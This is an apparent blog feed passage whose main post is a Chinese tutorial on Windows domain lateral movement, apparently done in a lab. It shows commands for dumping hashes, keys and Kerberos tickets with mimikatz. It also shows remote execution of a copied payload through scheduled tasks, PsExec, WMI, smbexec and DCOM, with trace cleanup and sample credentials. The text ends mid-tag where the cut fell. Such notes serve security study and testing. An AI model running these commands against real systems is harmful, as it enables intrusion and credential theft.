37cc4ff145a04de84465e43258a8e45e4d543e694799f114280446613fe03731bbea9857bd126a6edc51994ecd3bb593e35ce3688cf1c7012d2d60a9bb10ca7de48556ce51e0d028a46ae58d1555ad3d1cf7c02a6ebc2a26f2abf4806b2144da62fb84a50c9d18fdc072d25fe7147488f9be7651cee5943fa4afe49e6e1cb02dcc19c04c025914009f24ff419166ef901cb5fa7c737ba2721bdf4610e640b1da7ec2486cd7098573a7a05047bdf8c928b2c8b8ca32a545d8c14a3e5dfed17e2f662665761033bc0bca35debd22dd4b0c9f778101b03347835340c78252d6bc3d80d0f1cb6b0a08cc02005723b664dc1fdd3553fbdd61a03d5b8f98ea4b842b817575760b91a5bbbddf2816abf855627e7e6466e660ce6767728c14135688dac1bec984e0478f487a991c45400c52c020323891d230363325e0627d4b972f1f5af76f4bdf2f163bbe55bfad950681ae3beea83c4228056ee2c1af0d0eef35f1ad02352d771bb1e1fcbc5a70897059454596ab5f034d8af45650dbe910ac11ccf617f804286aef1125946265f69d43f0e5ed6f5d5b69e8a13be0d13f7ab45d1e2a9c6a9982c1fb0f26314506ccae5eca72366c7a1e26dbb687f78e8de1cacbd20253ddd95e95cd0fcb6d43898d151d88e13dcefb7867260ac092eaf3487de07fbf617477b0d265889dd7fdd58ea0e52a571111c7163d6c86841fca8e4826d1a1376f0eb4a06092c4d07c0ccb127ad1325310dc1c3b3e4de9b9789d48b3a590c5250b1fc36d481ba190ff94e6f0af8db9ae590d11928cf9d45bf6d42058b336f3950f3028c8d9c971f27a1c091027963ef6c921f63c90a53d9ccc9d5e18ccf930d2af1ca19d232532af2de40b559f6e48a2cedad37cfe71650589000ee1d66f3649998303db5da794f4458799ecbb1b20d38dd8e488603f943bcf3a308816f2efdd3ff295b085f341f47b551a0d60563b5e2429fab06f8e814a7674ec83704e32958017f925cd7efb0092aeb846a69f3e5d68523544a6a8cf7492b2e294e954c9ad66142d6b4ae905ec2f8a97ae27888e5c345b1e1c5a91dce757d5cb3c88daf3768a1824fb562f75217d1bbd9fb86350bd69ab89f4bc4617a25058a897f8d3d0f0ccf8852c8bf02889f1b2b0aff7326004ce83c1a18c3106604f074a893218cdfde473848ea91cfd0d8fa87a8c330a879eb8999a5d684e50ffa5fc1ef3f4e3fe2067f938f1ef8bd53cd57e7395d056e07e676f89a263ef1097ddff2ac58cee7d6cdd8d7cac96b6b3aa1d47831551ab0974226a1b8b46c9295f8327408e111f72f594f56c00e981b522177d3158eaa12fa38338f0501beae9ad4317231ed1b0bfb0bf62ac7ea2ae849761bbdf9fa676bd3e023d5c48b28d17e2332e6691952c54b83b543528be9b165ce3171129d283218b1e84274056194d42e87390f57d277f506fb20a2243c374a5e85ae59124e9ddeaca61164ea8988a6924dd723d56ac10d15fc339cd51dfc49562e5d0c9789ce301fed36959a9d90de03092a329523a23dbc087c5aab00cabefa1789bf2a5f8b96d94180badb2b5e2e36a93345899cef81b026ffca792de6dbdbcc154ea4c1056a37ec94c9c03d57bb7702f003ea1751c8e42a8837bda42311811d4c601e3ba11a36741d8ce85ed499a1dda7812cc8ab08a7c5e7ac5a26cd5cab8282be5494ed16dad219cdc6f1ef424e34f8a0928aeca129d056b7eb75bc7263d9faeea2addba80869efda93fb47da0c990df3f4958ac0d6499e7fbd5b1386d9b3e0bf39c306a06397a07d0c71d5411efd5d72380c1db81fd67993d4dbc5e430058a1cb22ff0dfe6da8a32fab305c2325262c9ffcc5d40108fb3e5f390cd7aca82bba5fc8b1c8a724beb8bf1c2510371b8a497d16cc74e2f03b23e2cfb1d73c5babe19628e02077c4ea9ddeb7a09364e4638e8f93782a5e119a05a6c61a4e479f5fc7ec09264b9eaa9ddbc9410b97349ac822d52ffbc9ae5a2f47c220d0e142948e3128a4f86d5197cab1882f5a09dd425b93a0536c394c6455bb10a94ff40e1ed1ad1abf29d183c878d5f7b7b8944b6a3637ae88f82a68418ffd4b00329bbb11d3048a6c134df9378d8c4c715fb55f6cf633777dffa7c8eff28ada95cd7d692cfd122a8e902426ea843097364d5369f0566c75e95a58344054ffd5692d13122d73be5868730345138185003cd06652d3e76e5c749bff1e1b208952cb8de13410d3fab48f17aaa93bf4f7bcec5f4e17cf349da35b6c60fbcbfd8ab98a7f5579cc20c8ea381a416c4978dbef3a0dc5c67fe8e4a9e0ae839e4e84ba554b67223a31dd8eeee4d7fbf87eeda31e665db1287c053ec59f9d5a6b518d15f0f0393c0a5f6467757e03d857ae4aa3d95a2ca1cc1cd937d0b0b6cb1b7182c92083f07a403138528d270a0c17a239738800f765d7a10e5e7101b1dee6a207f67211c3ddfdf748c3d60810c7135647bd602369a31f9a516519e4c5de1b902a8c805698107ba6a33c41ea8c402573fde88daa6436e932020c831bbb54b286a7702b6e34a7a96ffde0df453f4bd739c2b0cca4f503e340e4a2ac18ad4bd6287b0b891a86433895a6c6a4c75e3ec2e25bfea33beef8f55894285e74db95e2d0d0d4c94ceff787308546695ea73b3a52381c16ae8bc6572c0f9b917a924bc937b3334ddea5cdc3aca105ddbdc0c14375345082aad4ec933222d6b31c290aff4980c47be90f28c6057c4ad2b2bcead96eebd3f7abb7452032fc632d1d5572d832c7aa78014c3e9dfc1c5b137ecafb37f43eee449a7e37305c24774359c08f5906604402aa5280ce126b77da421745de3a5e49b28041321894a762cef43eb0a6b99807c20e06156d272dda66e85a305115270c67c1bf158024c5e30976949dd9fbb98e853108061b34e70b7feee525ef0831552ccd7036f11c513217a9e7a602c285a4521b42186398cf6842cf4c34b8913a894b3a327db8ad997bb5a803dc84d8a6421578b5dbffd5689fd65a1d0548857961506ed7b4bca5f989ca4986562821e9df31d7e7b2ff0e42a88f3a4b71be4351142d10f79ec97f5ae789c9c062626ff86bd8e42650468a3759f466c55aff5039015ba2d3ab0f9e61c2bf5cc12cb61cbe7aed2a7b37acecbaf4aab994aa7d4eee3765756685f7c1bbf79fbd33f9b719047f04eced4f192c05e1f0c6ae9072a4d1f2700eb847688121f200defb234a600a4c84ae3b85fd9d6d50b1d4bbb7ecf87c16e31fe78682b4dabf4f57941d33b506ac44954e1105075a421a4e9187d8bc40c0be0c4b31f7e2d17a7b9d31486890d0f8da7c897f03838ad91d4b92b1ad7a428b7d1ce6dfc63ace70815b53fda74fc7939a115ff0bc8deb808104af756744d29e6d4edc2188cfb9a19dded56dfeb11a8d34745b1a5dac876dd84b4ab5d7073dd39529b18f0c7329d8dd9fac7a0671fbbf16793c5dea940b5f4cb097cb2a2250f3d069d4725d537629f1fbb3db2495a9a1fe5d3123e6f7c3178114dae7fdd7fdd43a9b1fbf5da3b72e54a65ef5fee11c4eeb4246c895176dadc4f1536cfb7267d3e7bc8b09f8a197bf07183b48418b6c15785c245d823e84802f3909c36680cfb5f64fc174ccdc3220003d7b0ca1b29f3d21db2e48bb02f8f713d869634ac29923cb67a9281a360a092ad386fe40445362a7ccb38ca0e0bf306e501e68e9666ae6db1d231f9d2d53770c57d5b25e5ea97238f4903c38f4b8d75e2bbd08ab61844cfe2e6785ab30e46f9d10f405c6dd590003447fb6da43e30f6ec87b699fe6905063c16e60692b034c4317b5e0a8ad7cb014a3932d9fe63b1f8f238adf80712f363ecc1feb1c308c4706b3285d3f5156c445e68ddf98e4a7b0d64a5a291c5673c5eb9e6fc844fa69955a3fbd78a631aafce8d8b887456f382fc998f32defdcfb8b501984d0fc8cc5ae2095ec4d046ec86f9e480159be8bf2bcfe5b5374867dfa359d896f31905b65aa41659d659c0db4ac81180933ffd17cd3f83b65a2f0741d14124e9411a66e2fd9bf5f5846eff2e13cd72c20a1421ecc1deb1b141da884de617fb5d29143e49a4bf82f9bb4fdf2228a59510f04ec48161ada458aba6553ac837ad73fccde1335f9aab2b325eb7ca294e860c1cb87507b99ffd17b1a4a12e8454826cd3867f96478443a1da77687ee94d10fb8f033b311e324d5c5bc0c9130f9d6a8137b947c7e1a6bf95f7d4c6c362371cb4e9ebc7a7e52c5b70937f1eb3904cb3873ce7fd4febdc5727636e11bc94a6fe6024520d35a948dcb843801e3dc3fff9b78109727bba919967cce9bf1fe320bec8e1c5d1932dfefcf38e870acd9c05b27f53948771564d7144e22ab93d1f6f0eb1784110902501495cc991254364eb541fb2a74fec10431664cf9436dc705c5ec5ccbe2e5503d54244fe67a098c11eeb57977acc5fe7c3d4ea7f2035f2dec672ba6a819bbdc036b51ea9d5fdd506794e91ba31b9d43f489767a710506395b79291d6fb6e27d063e6f0c1ddabc16e35be7d2d644a175b7c42464f0668fb2d7ffc54d1d3b5ce8be28f08977c70391a52c8c02d5afd149dd9226627b72205a953b437a96c1e701d57b365352c7fc5953a8da5f3a83f59d8863ed932903806d4bd980dd531524598052317a7a46d3e33a7d02d6359971e2932c78d61f499dcb4781a7e7cbb11ffe79155e89103b26b3092979a30782d7b5e329071db2982979bb16d8994569cb128ff0d17301f5748844827d7c4fb321a08f9b99cd34e3c1cc7745249b52d545c3d1c875fbfb08b8f00533b4cb989cb72d10f071722d6c32abb84087b3b1a3caa6b69b20d69c48da94eb8366802b6a5b796c57c492a7b9942332d54e6377dfc13e0012b21bb1449959faabc308035b39fb8ea72689e08c7411851e4e84766856691ceaf58701d478373f91af7fe92afd97f98a3b23ce2957d7ff23eef7591fae4c5e56a2242ee6c3e960fe605256dd6f1776f046c29f19c0f0ccc9847bdd3e86e40c37068ed46b8d2e6b936c7d8a365ba1119affa99d4afab3780da765806471e74bcc058fbdafc6a9e6a7b2cd66af92f789215a8b56b8b4bfad65a65d73bdadf9490c488006b8cc791ccda94f92680f644e99e4d9e65cf52d34379eb0c321dea20e658bd11713a57e5943614f421e65a41acb1c3aaccc744c61a4f1b1676337e3b96b26e60690269eb4c49eefd6c6a341246ac11d1973b8c14dc0ed0f9a749d7b4b5f769d3b74cbb1c1f76ba9b747f6212496db894c660354e4bc3b7e773c220a45205b677cb2830d990fb1328082f166f79635545e58a899869ad912d8e2cee5a5a56c49b2f6763618a5f92aeeafc79f1673d9815751803f7b89cdefc0c7efd52023657c6f3abffcec80031643c16310d318c5552f639851439884ff8d4dc579c8ecc0f3dac64bc04f1d02fb396b6edf5ad867b61b85b54c5f1c134a9e828efc3fb51f83902b201f359dff3c7431805505b26533385891c01a7bcae274f990d202a48072b04a7c105124473476bf691e91759143b78e5b33a7de72bc47e6b753a42da2e302a76961194b2b1d9c687cc9fd938886538fad501543d497c8e9b7ead02763e7b8f5bfb0e407fb7221a9a3e9da6a65af0729c3be5d3589f93eb15e6a3db0f25c1747689299893a7a23b0301acd375b4b201c2b0d615e7a3f0e8b6d3d3694d03679f566834ae5fc325611a62764078990fc6ed39bffcaf2e7ce2b780507cbdedf7ed11455cf34a8d8fecc7c73d1302e9b321965950c0111a6122e6d5e12624627698d54183a05d74b4178d1407f8a399a48ee64e420b99cf8f17ab81933b453477468ec03d65910ade047c60c3434c798697da0a0b58e46bb58732542cad299aaa4d7b3306bf15cfbc06e6a08fbb33821d5a794133bc0c160ed384ac31b0f74f7d56318605f2794209d14cd34cd55e448adcc2eb32c31572b525ebfd5b089a46fa97037efc7da5e98c5a825572348bd66d2ba285a3d3f267ea17274186d584eeabd52c10264d7695e6b0beddef43190a564a8fbe76f8163cfe2558ab305385a2faee26ffca2ad55773a1b917650c292dde10f74067c790825d48b56269ab99b664f76711daf410fed988dce4a27d1180904f8afe06989031d77b33c959bbc15088c3daec383e65ab562e72e079aa7c590110bc394c412cf57003358c38e7cbde8ad29ccec7f1d9809ed5cbe3a696ee44b4d84022b37415d0d0095da761fbee22719d3ed23d04a512b9dc6061d314e233590b3a7c23dcad5ddc50509da568b5cc30456e2f44946cf42bc5b082f369ebb14607675c93c80b4cb57d01bc8bc792f3db54236ffb9ea286f8402a13ec6c378b29a1a1dd37ef31d4445d115c671e21b2e1cbb1540876670417685cbf747a76e5fa0c5aef1fc6ae8ba7274fc9060cac6c6ffd9c5df1d8b2ea373dc68ed3f914f2411845b32e6197f9dae0226f1fd29d2285be8de81eb97c1f2472ba8af1b15a4171cf2aa645fb5040bb6c15f61884cc258ecaf4ac560d1fb665df01d95faef4525a52d549395bab77e8c69526df205e691b307fff124f4aa2122f6bb75121b860fbc73e3d7d9785950c77ff67f522e22c905b146ea510f2dbaf41a02437e9ab41e16bde3b978360d004451c9e96ca14108a948686f089ec6c5457</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idea</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域内横向移动</title>
    <link href="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h2><p>在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH(Pass the Hash，凭据传递)的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程Windows操作系统中执行命令。</p><ul><li><strong>IPC</strong><br>  IPC共享“命名管道”的资源，是为实现进程间通信而开放的命令管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。<br>  IPC利用条件<br>  1.一般来讲 ipc$需要139，445端口的支持。<br>  2.管理员开启了默认共享（默认共享是为了方便管理员进行远程管理而默认开启的，包括所有逻辑盘(c$,d$,e$等）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\ip\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:username<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20210530130938242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>建立连接后使用Windows自带的工具获取远程主机信息</strong><br> 1.DIR命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\DC\c$<br>或<br><span class="hljs-built_in">dir</span> \\ip\c$<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132029857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.tasklist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /S 10.10.10.11 /U de1ay /P 274355ZWz<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132132743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.at 计划任务<br>确认目标系统时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net time \\10.10.10.11<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132358206.png" alt="在这里插入图片描述"><br>将文件复制到目标系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy payload.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132907274.png" alt="在这里插入图片描述"></p><p>使用at创建计划任务（现基本为schtasks命令了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在下午1.30运行这个程序</span><br>at  \\10.10.10.11 1.30 PM C:\payload.exe<br><span class="hljs-comment">#清除at记录</span><br>at \\10.10.10.11 7(at的任务<span class="hljs-built_in">id</span>号） /delete<br><span class="hljs-comment">#使用at命令执行命令并将结果写入文件</span><br>at \\10.10.10.11 4.41 PM cmd.exe /c <span class="hljs-string">&quot;ipconfig &gt;c:\1.txt&quot;</span><br></code></pre></td></tr></table></figure><p>使用schtasks命令创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在远程主机中创建名称为”one&quot;的计划任务，该计划任务开机时启动，启动程序为c盘下的s.exe文件,启动权限为system</span><br>schtasks /create /s 10.10.10.11 /tn one /sc onstart /tr c:\s.exe /ru system /f <br><span class="hljs-comment">#执行该计划任务(在建立ipc连接后不需要输入密码，如果没有建立Ipc连接需要输入密码添加  /u:username /p:password</span><br>schtasks /run /s 10.10.10.11 /i /tn <span class="hljs-string">&quot;one&quot;</span><br><span class="hljs-comment">#执行完后删除计划任务</span><br>schtasks /delete /s 10.10.10.11 /tn <span class="hljs-string">&quot;one&quot;</span> /f<br></code></pre></td></tr></table></figure><p>此后还需要删除ipc$</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use 名称 /del /y<br></code></pre></td></tr></table></figure><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><ul><li><strong>mimikatatz</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /ntlm:c271ea43b54feee894fa2d0860e8914f&quot;</span><br></code></pre></td></tr></table></figure><p>输入命令后会弹出一个cmd，此时可以链接目标机了<br><img src="https://img-blog.csdnimg.cn/20210531155122114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用AES-256密码进行哈希传递</strong><br>获取AES-256密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::ekeys&quot;</span><br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20210531155712911.png" alt="在这里插入图片描述"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /aes256:9c089a15cce776f40c04a817e8df797f6fe941a96f7803e7d00288255a4fe1f9&quot;</span><br></code></pre></td></tr></table></figure><p>使用AES-256目标机上必须装有KB2871997，该补丁禁止本地管理员权限与远程主机进行连接。也就是无法通过本地管理员权限对远程计算机使用PsExec,wmi等。<br>也无法进行常规的哈希传递攻击，但Administrator(SID为500）依然可以。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz同样提供了不需要管理员权限进行横向渗透测试的方法。例如票据传递。</p><ul><li><strong>使用Mimikatz进行票据传递</strong><br> 将内存中的票据导出</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><p>执行命令后会在当前目录多个服务的票据文件。<br>使用mimikatz清除内存中的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::purge<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531163654397.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::ptt <span class="hljs-string">&quot;票据文件路径&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531164927845.png" alt="在这里插入图片描述"></p><ul><li><strong>PsExec的使用</strong><br>先建立ipc连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取system</span><br>PsExec.exe -accepteula \\10.10.10.11 -s cmd.exe<br><span class="hljs-comment">#获取admin权限</span><br>PsExec.exe -accepteula \\10.10.10.11  cmd.exe<br><span class="hljs-comment">#执行命令</span><br>PsExec.exe \\10.10.10.11 -u de1ay -p 274355ZWz cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531172128129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.-accepteula:第一次运行运行会弹出确认框，使用该参数就不会弹出确认框了<br>2.-s:以system权限运行远程程序，获取一个system权限交互的shell</p><ul><li><strong>msf中psexec</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/smb/psexec<br>exploit/windows/smb/psexec_psh(PsExec的powershell版本）<br></code></pre></td></tr></table></figure><h2 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h2><p>PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单。于是攻击者逐渐开始使用WMI进行横向移动。通过渗透发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将wmi的操作记录在日志中。</p><ul><li><strong>基本命令</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:10.10.10.11 /user:de1ay /password:274355ZWz process call create <span class="hljs-string">&quot;cmd.exe&quot;</span> /c ipconfig&gt;C:\ip.txt<span class="hljs-string">&quot;</span><br><span class="hljs-string">#查看执行结果</span><br><span class="hljs-string">type \\10.10.10.11\c$\ip.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531223510977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>impacket 工具包中的wmiexec</strong><br>进入&#x2F;usr&#x2F;local&#x2F;bin目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 wmiexec.py  de1ay:274355ZWz@192.168.252.16<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531224615512.png" alt="在这里插入图片描述"></p><ul><li><strong>wmiexec.vbs</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.11 de1ay 274355ZWz<br><span class="hljs-comment">#在远程主机上执行命令</span><br>csrcipt.exe wmiexec.vbs /cmd 10.10.10.11 de1ay 274355ZWz <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531225801991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-WmiCommand.ps1</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     // 指定目标系统用户名<br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;文明密码&quot;</span> -AsPlainText -Force   // 指定目标系统的密码<br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    // 将账号和密码整合起来，以便导入credential<br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span>.PayloadOutput       // 将执行结果输出到屏幕上<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531231216112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-WMIMethod</strong><br>利用powershell自带得invoke-wmimethod，可以在远程系统中执行命令和指定程序。在powershell命令行环境中执行如下命令，可以以非交互式的方式执行命令，但不会回显。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;de1ay\de1ay&quot;</span><br><span class="hljs-variable">$Password</span>=ConvertTo-SecureString -String <span class="hljs-string">&quot;274355ZWz&quot;</span> -AsplainText -force<br><span class="hljs-variable">$Cred</span>=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br> Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList <span class="hljs-string">&quot;calc.exe&quot;</span> -ComputerName <span class="hljs-string">&quot;10.10.10.11&quot;</span> -Credential <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><p>目标系统交互运行calc.exe程序。</p><ul><li><strong>smbexec使用</strong><br>impackt工具包中的smbexec.py</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbexec.py de1ay/de1ay:274355ZWz@192.168.43.16<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210604232720985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h2><p>DCOM(分布式组件对象模型)是微软的一系列概念和接口。通过DCOM，客户端程序对象能过够向网络中另一台计算机上的服务器程序对象发送请求。</p><ul><li><strong>通过本地DCOM执行命令</strong><br>1.获取DCOM程序列表<br>Get-CimInstance这个cmdlet(powershell命令)默认只在powershell3.0以上版本中存在。也就是说，只有windows server2012及以上的版本才可以使用Get-CimInstance。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-CimInstance  Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605122217481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" 